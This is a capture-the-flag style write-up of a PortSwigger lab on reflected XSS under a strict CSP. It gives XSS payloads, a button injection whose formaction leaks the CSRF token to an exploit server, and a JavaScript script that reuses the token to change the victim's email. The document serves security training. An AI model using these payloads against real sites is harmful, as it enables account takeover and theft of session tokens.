#  Reflected XSS Protected by Very Strict CSP (Dangling Markup Attack)

## 📌 Lab Details
- **Title**: Reflected XSS protected by very strict CSP
- **Difficulty**: Practitioner
- **Category**: Cross-site Scripting
- **Lab URL**: https://portswigger.net/academy/labs/launch/417f3bdbf234c3c15104e0712f05c5f080950e7ecc18c37b7fdafde0149be0eb?referrer=%2fweb-security%2fcross-site-scripting%2fcontent-security-policy%2flab-very-strict-csp-with-dangling-markup-attack

## 🔍 Summary
This lab demonstrates how a reflected XSS vulnerability can still be exploited even when a very strict Content Security Policy (CSP) prevents JavaScript execution. <br>
Instead of executing scripts, the attack abuses HTML injection to perform **form hijacking**. By injecting a malicious button with a custom `formaction` attribute, the victim can be tricked into submitting sensitive form data (including a CSRF token) to an attacker-controlled endpoint. <br>
The stolen CSRF token is then used to perform an authenticated email change on behalf of the victim.

## 🛠 Steps to Solve
1. Interact with the change email function. Notice that the injection of common XSS attack payloads, such as `<img src onerror=alert(1)>`, is blocked by client-side validation.
2. Use the browser DevTools to inspect the `email input` element. Notice that:
   - You can change its type from `email` to `text` to bypass the client-side validation.
   - Within the form there is a hidden input field that includes a CSRF token. This indicates that it is necessary for the email change process.
3. Change the payload to `foo@example.com"><img src= onerror=alert(1)>`, embedding it within a valid email format. This makes the input appear legitimate in order to bypass client-side validation.
4. Submit the payload. Notice that it is reflected on the page but is correctly escaped, meaning it does not execute as a script.
5. Add a query parameter called email to the end of the page URL and use it to attempt inserting the payload again. For example: `https://YOUR-LAB-ID.web-security-academy.net/my-account?email=<img src onerror=alert(1)>`.
6. Load this URL. Notice that your payload is reflected on the page, but the code doesn't run. This is likely because the CSP blocks it.
7. To confirm this, check the browser DevTools console for any CSP-related messages. You should see a message indicating that the inline script was blocked due to the CSP.
8. Back in the lab, use the XSS vulnerability in the way the email query parameter is processed to inject a button. For example: `https://YOUR-LAB-ID.web-security-academy.net/my-account?email=foo@bar"><button formaction="https://exploit-YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit">Click me</button>`
9. Load this URL. Notice your injected button appears on the page, and that the Email form is populated with a valid email format.
10. Click your new button. You are taken to the exploit server. This demonstrates that our attack was able to bypass the site's security and allow redirection of form submissions to an external server.
11. Notice that the CSRF token is not visible in the URL. This is because the form is submitted via the `POST` method, which sends data in the body rather than in the URL.
12. Go back to the lab. Re-inject the button with its formaction attribute. This time, also add the `formmethod="get"` attribute so that the form is submitted with a GET request. For example: `https://YOUR-LAB-ID.web-security-academy.net/my-account?email=foo@bar"><button formaction="https://exploit-YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit" formmethod="get">Click me</button>`
13. Click your new button. You are taken to the exploit server with the CSRF token now visible in the URL.
14. Return to the exploit server and enter the following attack script into the Body field:
    ```sh
    <body>
    <script>
    // Define the URLs for the lab environment and the exploit server.
    const academyFrontend = "https://your-lab-url.net/";
    const exploitServer = "https://your-exploit-server.net/exploit";

    // Extract the CSRF token from the URL.
    const url = new URL(location);
    const csrf = url.searchParams.get('csrf');

    // Check if a CSRF token was found in the URL.
    if (csrf) {
    // If a CSRF token is present, create dynamic form elements to perform the attack.
    const form = document.createElement('form');
    const email = document.createElement('input');
    const token = document.createElement('input');

    // Set the name and value of the CSRF token input to utilize the extracted token for bypassing security measures.
    token.name = 'csrf';
    token.value = csrf;

    // Configure the new email address intended to replace the user's current email.
    email.name = 'email';
    email.value = 'hacker@evil-user.net';

    // Set the form attributes, append the form to the document, and configure it to automatically submit.
    form.method = 'post';
    form.action = `${academyFrontend}my-account/change-email`;
    form.append(email);
    form.append(token);
    document.documentElement.append(form);
    form.submit();

    // If no CSRF token is present, redirect the browser to a crafted URL that embeds a clickable button designed to expose or generate a CSRF token by making the user trigger a GET request
    } else {
    location = `${academyFrontend}my-account?email=blah@blah%22%3E%3Cbutton+class=button%20formaction=${exploitServer}%20formmethod=get%20type=submit%3EClick%20me%3C/button%3E`;
    }
    </script>
    </body>
    ```
15. Replace the academyFrontend and exploitServer URLs with the URLs of your lab environment and exploit server respectively.
16. Click `Store`, then `Deliver exploit to victim`. The user's email will be changed to `hacker@evil-user.net`.
    
## 📖 Key Takeaways
- CSP does not automatically eliminate XSS risk.
- Blocking scripts is insufficient if dangerous HTML injection remains possible.
- Missing `form-action` directives can enable form hijacking attacks.
- Hidden CSRF tokens can often be stolen through alternative channels.

## 🖼️ Screenshot 
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/2ab34bb0-9f41-427f-90b1-e73ca0c5cec4" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/4dd801a1-bc37-4219-b827-756ae47f0a30" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/a2dd46a9-8915-48a2-a000-48a9be356376" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/b46bff5e-0ac8-4e69-a161-21e45b0e35b2" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/5b4c1bce-1a6a-4a02-92a5-0ad7ef297a7d" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/bf902f4c-f671-4a85-bab2-c2f21f3ff0cf" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/fd00703b-da74-4865-9b90-6e27fc041b86" />
